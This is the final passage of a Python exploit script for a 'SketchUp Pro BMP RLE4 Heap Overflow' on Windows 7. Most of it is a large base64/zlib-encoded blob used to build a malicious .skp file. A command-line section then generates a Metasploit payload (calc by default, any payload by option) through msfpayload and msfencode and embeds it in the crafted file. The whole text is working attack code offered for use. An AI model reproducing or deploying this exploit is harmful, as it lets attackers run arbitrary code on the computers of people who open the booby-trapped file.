                XmNYIjqv8TmyEnWqNzpYtJaG+fQ1HQoJvrjIwGBtxd4iBUFVNTWxFuugHJQdX9k29toB6t40J/+q
                dOMiGn+PdS9x7KdIhOcqiHBYVW1hbdXUP8F/Xjg/XksvkpYrma4S0vre90TZx4Hq+x25esdOIstH
                lycZ6YTfkzvtLJGC1uA/o/H60s259T1RA2XqubnrA1Zt7pQsb7ypZ+j2p2OuxfX6kkZXt9+tFara
                u53pXWpfNuSmd1jEy8sry/TdiDT/O1frrAqhozfUq859WPAsaZWh5PPtXy+edvfwfJZx44h9noAW
                2VE90t03VgptxEY9kfbNZ8/qR3WOmrsa/rT73Wz27HIaRWhVsoxB8mb/R12XfDoDTw2O8Yi3ha7f
                mK18uOrBH+V2a/lbUYYh/a+aDhycYjPvrfGJ++L1qH2Ne+74n/ty9tIU62axpTeHv2/r0/OoeSWQ
                meTg5XX27NnA+6UuQ6WHiaE3WtM32/3yjvtabGtT/PQJcS/StiAy/lzD8nMp6bmqGWiMLkITBpri
                4jujLa6WnLx+5NLIqtofD8x+OOV+N7s/R0coGVmi4tV1L/PGrmdb6KPooGaN8NFlJ4uPq901OKcN
                Z19pQhPII53OxzXxirabp2W9bSl8fYY8y7Dyl0HMJXPuP/e31WrtdeyR2nhU+O68xaEGdx92vPYO
                NZDZ/8X+VHSU5dXynOZpuwlQlU/Fh0JzyN55XjUfmixUc1+tOKC6BI27pegI+DM8GHJ3n3GRbijf
                0sXX96c+z7HZJHno9M3BPx8WJNx4ObNzYfec1jmNPx8VvvS2MZDwajrxNLEmdlTg9liPfms1mpks
                hq4K9z1ZdvD1jx69x+ejpyckJnp4ezfLHUKH4aGCpB8fPN68e/cqds3wdP+0l5TPT6q5F56c8uvX
                L9U5c+yOIoN1T22PEK5tFIQT5stUHtDmW36W0PlwbG7M7hRlCPYiLIpcCedN1eOChxX+nAlt6bvK
                PROCrm+evrGhoUFr+pScBsLgWvdm4/Qfqgsrl+R4nVyY/OTeMVW+UreDW27MXCMzlpEqGHPlJbf/
                67Xh8TVVr+YMa4e800TT/tqmYNGZBEhCUjL4+7s7aT1HCwN/Hrm8yX5O+tiyaVs31A489PW+mKD8
                sNKvU9mM9nNGz+CzRGG0O39XDDe9pJWvSp4l63NJ4NPDik86ZlBxcTHUajFmJqm1hGfjtcGTegrU
                IJp7c3hMzPXhr3X55yIf5Vr5h93Zk3XUqfDVzkVzA18/pL6qCvCR0Xpg8jroQmd/S8DofJkvCpqa
                gk67NK42ZPH/MtnUwBUQ5GHv7jXFYuxXa/8xiz8nOndvPF5TIx0aGjo0dMSvRt1C/Ob+p2krj5Sp
                jb7uH0gLDREtX6h+PvaFlnn7kVevgqM6zwu27NIU35idhI4PPt6yMsttSnUNJOhMdfXplYMxGms+
                x5sNW6z1gwYGepY7HzQQdjP/pbSwwkdZaFh/9UiaxJQpV3uScq2sL11DO7Iq9oV5nb9ycoESL72a
                pIY3LWDsPV9t3XDAK8WuBKMlQ2tOjZIS392e5+KyufVc/pfmM3loJAWhLnolsvVL3xTJiANlZUV6
                y4QMox7LCQ0s7zwfLW0UJ5ci2Vufb6sqravqldFo5eVl9u1zWPmKCPWw1gObNX3PD1Ff9zh7SORN
                nyvELSyLZuWkLHSsm3l5rV+tvOPgwXw0PYumdlGF55S/IB1rGb5ScPf52Bu58lStxshTyMPoTdqi
                K0Jo7vY8PwsvKjl4V4cJvruzd2PdlfNT882rL3ZqnRA/VlZglCSGji6Kwzbi6mTlVzmIhBCav1YY
                7hVcvHhx8JNYNJEdLfRv2Kbs1Ne8PbL/89jnH3xbX8862efTxut80Jx0qm7UBJX6qOf+2u2hU6uX
                tdo6OOQYWZeoo1Ns7cePy1s9FK46OjlZ+fvL/uzt3DhcWF7/amPAhvtPculCft8VT/ty0YsebLu0
                /NRW66tuU0o2vS/fLs7FE+Hv4HBzxR3Y5DY6P/T396d9PHGs6uep2JcvZq7uEpd1KtRCAl8SzsaG
                PTsbsd1bpX3Kc3v7PYvmz1/3qfKyqwZ36Lvbu5tv3WogCZvR7sRG2y1dqkQPkKgnCubpz41I8shr
                gUx9Fy+vHTt2yBl0XP6z0MtrpD9/zY+yX5FDfS/TRn+911l2V8YtjXzZ/oX4pqZ1+01Tc0MV/IJo
                BaUnyvj23lHZdajs4wpEAW3cNd9YJKu380JAXx/09PL1zymX6ebQW2Bltd6bCDXeuLHpKG1JXrcc
                3yy6Wxy2q+QoQ/WnQ240ion6WaKXzn77lqCkpJQd2uq/6cqDzhWL0PbO+1o8i4+CFuoXtmTV1pqd
                Fij+s+fJmTO6pzMc0OXksoOrFmqsROMMLdpRWIiuwy5dheRd1NXUPsZXKM6dK3Vy0SnJlkJnt0g9
                65frCJZ7wi50Xj7bl2Lv4mLj4RGYumqJPZqH0Dm4XBu2/57OJ9I9Ynp63dtW40VmdzN/bEEJHadz
                7hUeeGinZbhmy8KX8SolqagxGmuImdm/hUiZ+nceITJdve51O6RjJL6gMRNxJWWTHpxNXzvpu7QM
                q/5eTjhor04v0Cp00ohYd7/nczUlQ6EiEPWgy34TL40ISze78uzH153S0SWLy/eBPc2PRgs29fa9
                vIbchdNm8fTMQCWdvGDz8cGDB/4HL3pfuvzGsdF0nv1XusxtSjnKc1aJylG7ttlLxKBXFp/RuLb8
                XG7onFVtt1oEt2ATdQSiaTloQ4N6/bytX9KbdLRs+cED5z9t2jV4TMRPDW1OOTpDobn7frBxyY/z
                G6wkbtElvX37dvUdWGvgk9KaRxa3WloMLudnfbBE7Q4z3u/quQhdnORveWTvs2q/xMyZM7/pqSoE
                0FnblORNTX01VibdNsvY/7iz8HfCQb62o+gK/I6amlpD8bz16X+UP39qfH7FE53ldUKuo+vMLrrM
                J70pt4t0jjyCeviRaAVPrynCZn0QlohEezbM0xCJuIlOAY3b7AK+cH3tHbtw5ozYzFU/PE61imbp
                3oXt72ckew940X78HDtRprZLY/Gr73L2ClS6jwceBnVIDWuk84s4bOu7ZyUckRK94YMlPTWXnTr1
                6LM5/6am9lkvbZNmo3P1fQ1JfgmbtYdV/ZNtPKoS37suSe7w8k+uKAiduuCYa28ylw3umYGBgaH3
                FmM58a+vBz2riU/70Wbn4ePzkVfcYVvBzp3KGR/bF3h1iCfsF16Tl58/eBF16EeU5jBDLy8vT0DG
                LE0ETWOZHcub9hhEFhw8KOzlFVT95LcGfObMmeIytfMxXbnGie/SLGPQKVlVQ+OzbohCu+L5/m1h
                izUkT/m9QxNS2u+eYy/jjKoyfn1zdfNPV1ZWrhl8vlIn+ql+bV8D/4Gs5L13NvhdTglqL3FovnNn
                irlNyZxtTzuz+K1XwR4SS1a83Tk08r21SR6qLwxYnfPr+/uQ1gPUV/eU+5sV87vvmn793C+9s719
                ft40A76YC74yCu2CqIerl2hJ0X5q98i19Mb6eXk1nY24bzZwpTvy4Mam4J7qR5HWhXyPYPvt6PoB
                nd7j0Rk/b7qp5BG7pYG3jwcNoXMb0cur/93eWIU5c9xGHiuHVj8pVuVDk0b8h3vy6IIqTfNw9ebC
                H1vQvK6BVuxbPxj86eDXwQejV1ZafPlzgSq9Q6fkkeAqqQWWlsQ9e/fGf3e5X7BVoLGxqP/mMjvt
                DE+hhxW+G9HscfsA1XdEemslOpirlRwauiwu3j1pqJwqw1VysOFaa+w1dPlQe13r6OwFpYFXqRde
                73z/5fsD2ZpZMzvOCRYZr+L74js0c/8BlfZZVxoU7jjaf1i9OehH37wqL6/ct06Ou5Q1fPWdNBSP
                BsgcCDCUqvP/8TUjy+YSup258zFi87WOpxtWDI5YakRueCKRM73y5rqO5VPoUxU63h76bf91U69j
                T83xE5fHzgvptIWdti4xpacRG4/+L6gDpx7MWNj+XvNM7uHgwWNdAUkd/S+6Ho1ttpaajm4/7j4p
                M3EZSYiJSshWFnbYIuJEn4xRnTGFFw4fH/rofc774T77BYOCkHV6A/16j2Xpgx1XOsde5j9NFNxT
                JC/qF0XPre2vX2Qr7zMLEXfaMz+x0kN80wgmXr/ix9Di0+RFkXu923dQD874cpqy295NWk5i29mM
                7CSrI9fez9tknU7PqZ9iZpSc/aEaczlaSE1d3UBKKerl0bgGekGlOP820aYAr+DGD/EH5C4+mAul
                SEXNeNzgRM+48rNMzKeKcilyCcz4xLvN44htSEiQvI+Pj5ZDUdL0qBfB/HOy+NFJYg+633IqULxi
                an1J0b7ksbz3j+4Qe9cZ2Tnis4JfXxjcFlCuffrJpa/kELQ+fVr08bJ5ZPj8QKNyqWLIG2GPLrHN
                NsLmGz48JufNMJVcM3RNT1VTEyleG1z95F5X0GVgast+kaG6d8oOtkuCTTbkXeKruL427WfTXO2g
                V55KKkfPtroaxvwo30u+zDOnRQxdXttpVGcVNvDN2aHg8illpr3TEe9vs9VUCB46vBDtoyRl0+pB
                o2mfJBVUbtGe5TwKbDvMXbBnz9NQP6ttJbJffxglHSfnBIuiqvvoqhcoBh8qU/M8R3Xme/GERFoS
                nnxerl1C2fz5yS1PHFBzoOKhk47Pfm+/3Pbwo3U1wlVAy5tHCszLayzSCXn6SE+Jd+HL9KfoqH75
                MOe5XVnS2T7z4WP1y1ysD9nPX7//mrjf0tzDgZ8H6/Kv/rlj5BlmlZDAN23a57gLJsW2wmvbZBRX
                v1mXcOFid0wkpfjwyyU7HxUdOSE0/GKFxPXmr6OCpapqpS8G1vR3tJ0ypTqUBOxbW1C6v+I43GUs
                HnxHtzTAVOaC617aB1Vxla6f5N+CMprmq+fZSOdla0sToJt/Qkw3Hw8vj/rJly9E93P7wHS4RPSM
                RsjLhqwiPeOjLXM+mYbl3TAdnmZW1z3n3Oe2whx083VNS6PdDF03B47uv++e/Dvb+4rSki0qz8wu
                RnJLetSg+dle13ZawdbV8Y/g9HbvVEnxBNvcUKh3vy82jcs7bFMSmPHYT7G3qWPphZd1ks62dY13
                IxV6n/+pkkbXRFNarC/RN05KDvDPt7tRV2dbSW3N3eesiO4pjhpBNh6nl3eleFcsjM+2v0CPddd9
                lZZfMtviLlxsPLTp+pOoG2jm8Me39hF7lBziLtbGynlKTOGXXUI60kYr3TDt1OlNdjbfL8Zqj34L
                egV5PEb316Vv37o0HToyq0kXCuyrf0DLNzCeKX5dSMLJOmgzmgQMY56lmZ37rTmyarAOSkJuGRqq
                9dU1fDGUegC5vU3W74z/PvCavlPnH+m0S+Ld7ayy42DZtftzrmTFqkWeHr2TT4BI7dug4s4Y1Ree
                +p6y1wc3DvLLWXs+6HQN/tZ4utei/8dMBQgd6EYO2+JerBqUN1Thc100/fyXIYkzGkHW7+AHByJF
                Zg46+fhMe1j3TXffwOjBxcmLc6detydFGaSYjfzgii9S1aBPgmjetBKmkhOTZMyH3sidqTuYs+cS
                17P+1w6PfTMkVKziqtceP65ae3EFaVqrV66VX80+zaJV93f2bhoc+6XwfGzZoGm3Mi+6sZPCukD+
                Droe/jR6SdTUwjhvzeVVas//FEuv5yrtftsg3PaOS+JCauGuuoQz1fHfd/C6e704dcZnWtlW00N/
                uq+fue8SbnO2z3qYsuDiorCrL+OyrfA+pZ/qmfX/UHv2p/Oc6ug36dGVTekj/WO3N1acF90m8ywg
                BJ3oH397a7RolY/Mt8M1ndpp7mqO+QezjFWuqleZnNpobTf1dMR9ldZW63SpZ3PzjwsvSe1KNkqq
                kbjQOixo/mxR7tjqV17lI6cuhkeUi88c8F2+XO13k232W1dPo72RQXn6gcPcw6IHH8ysEDKFii89
                3FJomMFz7KSgQbIgulFLWTks7WEUiC4vZquq1q+vG54htMj61SJhqQaJt2MzZKKjK3/6ctUpt+i+
                ezHMf9DucKPt3v5fdbf6r1/eKBKU3dh8aDZEqzA1v6Y51z9n+7KooTffE2qR13roPoz3oEr7HC6e
                rJLaEwteRkXAv7vbsrWtc69REy6cS6fwQBreVdD7MrcVHVcU5dVWKH1ZmaQudl8Tjei4+wNP3CWm
                fLqQ8eC5bTmxh7Tx1Zup0/e5HhviFun5X+09ezhUXfdHGBq5T4aQe/QWuRRyGzFkfrlfShiMuxfj
                Nsg1ktu4q0ReuZaicqlEKELqRSW3Ipcu1LhFkorMt8/gbd6+93ue3x+/f37P823PjLPOWnvttdde
                a5+99lnnDLy/ZX70KN+QHdqtZchFkdC1HE92TWeN5cZ5xorheGZqneucByT7+g6Mg0qQ43KZ1Ad0
                /7ZovDXKHjhOjZMherKycm+n9QlqpN/+/mRd+1c+cq8OSghmIhjtI71UzM8Mqygp71cb/90nVhIn
                n+tMuHmbhS1zFJ/jK2om8oi/z2EvsywGI9Id7BCuY/miIo0A5oOqiaamF6aWaQIWJ4GrmpmH8TgU
                1BJWcwiJRoYgPDz3lSCOdwIzRJarQO9lowbHjvq8bjfDe18Oay2flmyXUcWbxZZR74qYjtQFAtEv
                emkPPNrWWBOKtvmDmPP2u79Y/gME6PZAX6NGwYhFDIhmk3eegFKXNJuiskwHeZLqkwcl5HYLc/ss
                8Ucc/83ezuH0qdUKs+DiLe7l+RkTrH2DK1Hb9UvR27iQx7O7ugrnGCkU+batvLtEeTT3dUkviSSV
                fi6CovMqV7RQenqz9fooEY34F309HzAu2wwn+b1HG1+uxGLVYFM+d2HH10jRe1EtnTXbptMXI+89
                3DL09CE5SZkA25ggb9ztyrnTB3cxZPWtBQXU28SZcFHOgLVwHA+OfU7o2kV4yCu9c2JKb7W8yUjo
                QcWdr53RxWIlu/w95XOVnoVK//m4d4z0PcngPhiq5/GuHK1xx5k93autHbPCbXPOZ2iVlnVeuuc1
                YWRktJ0liRRXWSVTert+S3r60N1Ap8e6WZJ2SyV72gK0Uyb5az+ZW8NWDVR+tMJq73J57Y33crtx
                WaamptD5EpzQJ0Hb0N128toypbgsUotNqPq79+9L7k2mWH/5C2HU3dngmLdVPcdw12cTHFdn1GI/
                Ra8U3tz2jPnITPnR+NvxbP/eVIswn/dSyBD49NWrVxMVmb4kjxboESv6ke6BsdZf8irjwsSbYFHY
                Ppu2fzjdZ195URgTpbHjyTc1ux4VB7YleLVSlDHgf8VJlI2CiOUGy2Onl53fbsQ+4kbYy8ELtqIM
                lQP79hUukVl1XSoZAqKmRXmc3mSF1qMoO+Hd+IhGakhxyPz7usxFPAuF8kyf1t4Hi/7owT2rB+fn
                IwYOrR53F0MGwbu66Omuq4Ds9TZatCi2bx7K5DqfMzeo9ii1l8j6u3CbB/nBk3z1dkXaohR9YTbG
                e9dnBx0dHW1he2FJXPwIEZ4owQIBn7gfm3iJzSmYK+FA8LibznN1BCvlwYSzftIlNn1/lhDP7Sq8
                WaPwTvHjmpSXAy8PNf0+da4ccWKAz+wrCHTkuh49Pewc+ZRFErFnnjmseB4s2fBV1nsTydsabctV
                YFUqLHjp9AlHKRmofF86wnNEk7y/Y/xZka5TPRsuS/51gubISWPUKLyxe92YWlmUmmTy8OZTrT3Z
                DcBBBhYb32QbVK7v6ZYUFjZ/HN4KVlELVIxMdkPQbCnukIinTqk7uPykDvveF/5yF1n9SuJkup0J
                CLNtzFOsdyHDAY49uX3L4ZL7ecurmADNFyUjLJw7ZLJpS+S74ldbfL5Pd8+IpgWr7JBo56Fp65ii
                LF91n8RJ9WpIVE6Ow+d60/05cdrmwTmZM1R3J4Hu6hcNIZXWcwOTRnmOZDJvp9a3wPesZjLO0RlE
                0qv0OV/pbOAVKsoo8sROvQvFbVkma6/CDGhB3B6LxU/jxMVlhzUeGytecnJyO4P4J0bG0ySpA1JS
                hZqCC4/PE9rJ252+nRoXV4NjcFK7UzXTLS+NB1xJwupj6E48U6Cm7PAJHByHq4MrWrKUiGRO8cq3
                mYfmKGY9Pb2NexQhPG9L2rNMJuuimhBMlWVSU2TQWx4PaT7oUQDT1HTk2E5+T+Tes4kPGEAT0lXG
                e5td0lomu/Paa9A45GqFOC7LWvz5ueb727E70HCtvoFvWrrTfrgk60+PKR4PQLC1YVohW2bbtkQP
                qY1VViVe2QNsx7ww39o/iSKzoNCZaIR891QCyQnf8NFWr44Qvvbhab4Y9nUikIXXUPpo6W7gFQvv
                n2TM+XHnw3Z8F+VBUx1tuweKRorKKVQds+5eUgZrpmpD2rYWzEgSpx8UlGqNgGZmXM+ImdXBdxmY
                e5P6exemgxs0r0SKYsM6fJkpR4EkmiOZN8p/bw6J4YpjBMLBpxAlAlZWVvYHQKwNrseVFzCoEEHD
                XWfWd40o5vL51pMvSomcViny/O3m+yz3H+hr5mn+MYMtgsXeDgRscZwJViLkqc83aK/rb88z42vA
                p+8wBLxpG3RKSmyGxITZLvNWzOSEWL/wVsZ2SIf3r7YMs+4WAgobBApThC9ILzXO/ZbHruAfw2xg
                m8f2tiOdt5MWYuHZbvH+6ZG2MNU2dNyS6eCDZ5Sk0YM7nhYVFmrv5aVwgPaur37FVb+zIOmUHxue
                u2pR5ri/gxRWHPKET73mJjwuc6CZO392dhLSwHynhcuaqafamaEaqS1yH1nCLolLtXTx2SPZgDJl
                yzq3z3+P60FN3EaXFj8Idyb42lyYqnZsiQDaPgITnOlJvBw/x2nw+dJirjUjgqmGtbL43nfUXN1b
                Dv9og/PACG35kpnTLjdXlgfVD6mI/FmTIjKmxltezmry+dr1/qS6OtUNVrebh04MC6RmXqTmH3Db
                ZpMvm68fmSnv+MF6dcYdw8uSSIJvBw38iCFrihg9H5h8YNR7OSzqyU6MVuGgI4jjyKPU0s6iFGxY
                GyQ2MqVq2tNjmZ59OfDKddX4m9JrcZX3h5KHyM4eGse2Wi1EafabLrJny+Gnvr10qtb2vxMEtOMZ
                e9j5+2e4Y+oxsxniSAV4v/sGvsFvskvAsG6XoJmZmXxe95WKCl08XngtaP4IVpo9dvf3B9dtDcyZ
                7q1d5mhvb6fdtE0ixSqB7oDVKLjYSEhLs+BwOFATii4tlXRxc3szYOsmLlW73aqMg61AA4Oj6Co4
                T153yjU4BpTlBaKlzmzZxPR0dIJGQEBAhsq3HZYRkfKFaXvGJJv7OOPi4t5AmUTYTP4wln5yURPM
                g4A4lkFuVZWKqMS/k0rgbOUSeBFqIyxu1DOyk9OkFG3HKIYfrvURjPraKkKeIF4qK3OeHbptf/ta
                TwnB9MI4MZDZX0ks854/QufuJRlk9j6HucUlqwSJw2njnzrBchmCA75C5Xwdn/ZqOTyIc1JA72Tz
                uuOHhmyqX+kdOcIGwm7/8WYGf1bt8DrgiJbHjr09o0mN3sGdXHqrKMNla7Sk1pzewaErIhDEJAXn
                AliFjwbqoKZUGcVGym/ceOh6Hh+fjlnjlzvPtrS0NLKmE6IqpBq1qiouLm5qbz/q2uXhfTLoXFbW
                KVvf3KRXIqlxTW+O/KFWw+luIoR9W/8/t9Tyeu4dWmjAjK1PUZoYXgq7OzA8/RJuFg4hbTe3Xfbh
                swfaHj4svn17O+gXFiwsi4uLIQgsMPjlHaGp6emGxjmbm27s4KwpHp969iwKmj2kGDhpCM0yLHar
                jBWWlyPLTM4Wvuwh17WRsB1SunHIZKmSRZHDtDnnOreE/vid+z9k4e2elJRtWCwW8ijIbVweDX/U
                3a0XEKAoLiFBUMytOkmNKr18OeyHAOinh49Pe6bEYT+gObvw2dvy/PdWhnK63YCFiCsp9VpUVFS0
                5iq5O94Z9h/Eh4ROYcMkro50U5JIOlZWr4IG8Sc+Ni1zCQpOb+XWM9MIKejo6JBQUOBm4dw5s2p2
                pZw8TGxgX1n+mNDt1vooU8L/TdtWF3d3CQmJ1j0GYQGrX/2v2TftaE3gRCck6uwcBNYEoqvOffdT
                7oxFCR6z82cGQ2pmYcF4Zzg1J4ffIIsprxuBm7rLL4fjiVqqcCiqrxf4sbLcQektKyr/DZQqn2Fl
                FBrdOhucLLKoSPpg+ipisdvDc2EZ61D8rEWANS6/pkYRbvJj4yKH8UWNrbisKkIroitHQTcCBVVF
                /QhbnVS5v3AtHcyGER/Dx3Tt7IQ4RLRSknilxcWK3lcEjhBVOIRUo0caQsIH8Imfoxl03iUAll35
                6uiONGFdJyfxC3l5PX19p8F88mI22C5yqZ9f0SXxq0J6ba2ykBqJNXx5bja4VhdF/opMfsQJet7h
                XhAZH7ny5TV5z43oEeJhS0uUjY2NKI7HuEArFbBecN6JiGVojWdvXf22+E0tGXbqYlHVfOOIhXa0
                fK6hatAUColEykd89SstK1uxk78zPCsjJ/dQ0LexpWR09zsF7cQnZ8rLcw548QXPDsXdurX/88cx
                Eb7kdvfzA2iHiJiEnWGPbhaclkEBQrno7Gw+w4saAgmcIvHDs/ouLpII9h2n/d8+bPFWDjm+DAK4
                iYmJupW5hoXegrU+rxQZS3lQiyuhNaY+8P2bVk7M6V7K6fJyP7V8AwMDbWBv8eyC8QyMiOaJAALQ
                j4enZ0yPBzY09ODz58/bMGkGi/yiWLS1v7+CW1cOg5VVkQz5feLZtjZsX19fs6P8CZtTwhwsfPvs
                U9qT0WwnkZlfqtmSP2zpfPy4BVjk/KvAp2JKSrzAu4h3BJXz2Il3hqcbZYGpxMfHGxfsQgr/EcOF
                3wIU3q70VONtfdH8u8dn+DVOyANtVZEo5q89i58103Jv5rfzcXMzg2UWFnuIEM3FbWYKxMKizlKZ
                w6OCe06WTenBSUQ4PWPsDR3HUwy0BCsmiAfS1fX18fMluhJJOGIgiUB0dmWOhiCW6I0krDUq/EE6
                QN4QAQqESBB8BKeHnYAQXXv9ZjGfDmj/M0Ho+nsaIW1jzX8mCIMQm78FvplMRdcsjwvgQKRln8FZ
                Zg7giAT+AgDkBAXRMtMCYTq0A+RBY+wAKH1pWWxwBhqcleZAy3+DscGgli8tbw3xV3rZGpV9s+p/
                JJvHADJOB3CSCGTwpkniBfjC3SDQZFBYf6MXnJa3mQoXACEByHoQUob2Qj+/4XM+G7XgXhAA8X8i
                3JDx53N8QpDNalHzasEU5scPSXfb5s1XGUHQBozZxP+SgRb9bylqI6d093sravsps702H9irvX6e
                a/M3tzD0eW3WjZ2asDjbdEC3goC8Lhv5hDKQLmQC7YZxjFaQBXQIklZgvSZkbtMswHSUQ3YLdoPt
                ZqozXfObBXTMFPyThX4t//g8x6/l31Pt/m/x/9sCJymyQLoWXvq+RBLNDBCWYGQ9gL7gsV5/Ke5G
                kdSGGODH5eAcQLiPjBvHEJX2WkglWtn8dQxAjcFg4KGgrmdE9iC2bNRbf0YRxsKfHsT62R6ayTJs
                yLQVlsnPghTq7QpBj5NrtRa6D2OvV/S3NV4zHoWHGOYB/nPYgtHzBLL60ZwSzg0lAb+Dj/Ew3s6W
                ltfpBvoCjz+cE/rTzAMhOQDDdWDngW3DBUAhgB+cabqePXoCfAcBWldaZirMx5nWTuBf7Wzy8AKw
                KG1iIACH9KZxW8cdptV3pWW4OtE4eEHu4Bxsk0Ramz9lWq+Bh/aB/n1gXFcI04ZiKHQwXKZ+wc9s
                wDQlz9IhYWXN0SM/0iHhYZmnRy7QIeHPJ3rkIh0Sfsn8Z3rklw2AecO4lumRPSx/b/M5y09iOAe+
                lw6uqOqi9rHQVe6nAxgGWP6uh0F65IsNgOUvux3HFHL+ZJ3blEEtooM9WleoxZx0DErokM+f1VNL
                6ZDQJc6fTSuCz2X6mom8dEAS73rr1oJ0OmGgUo/TwbDj2NDjAWxLj0+AqHZ0sJ8ngYr/hd5RkK5R
                JzoAcqYHXOgBV8G/24bbL7C2CB3PQyK/KnQeo0NPoEtHcCEXLhRML+J5/H8d97+O+1/H/X/muNDP
                wvAvMxHURw==
                '''.decode('base64').decode('zlib'))
    return str(skp)


if __name__=="__main__":
    import optparse,os
    from subprocess import Popen, PIPE
    parser = optparse.OptionParser(description='SketchUp Pro BMP RLE4 Heap Overflow [Windows7]')
    parser.add_option('--payload', metavar='PAYLOAD', default=None, help="Metasploit payload. Ex. 'windows/exec CMD=calc'")
    parser.add_option('--doc', action='store_true', default=False, help='Print detailed documentation')
    (options, args) = parser.parse_args()
 

    if options.doc:
        print __doc__
        exit(-1)

    payload = "windows/exec CMD=calc"
    if options.payload:
        payload = options.payload

    msfpayload = Popen("msfpayload4.4 %s R | msfencode4.4 -b \"\\x00\\x00\" -t raw"%payload, shell=True, stdout=PIPE)
    payload = msfpayload.communicate()[0]

    print mkSKP(payload),


